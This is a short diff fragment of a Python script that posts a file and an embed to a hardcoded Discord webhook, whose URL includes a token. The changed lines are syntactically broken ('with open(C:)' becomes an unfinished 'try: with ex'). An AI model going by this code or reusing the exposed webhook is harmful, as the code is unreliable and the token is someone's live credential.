@@ -38,6 +38,7 @@ webhook = dc(url = "https://discord.com/api/webhooks/1172913800006094888/2wYTsKq
 embed = DiscordEmbed(title = "Discord File", description = "Success")
 webhook.add_embed(embed)
 
-with open(C:)
+try:
+    with ex
 print("File Successfully sent!")
 print("Goodbye!")
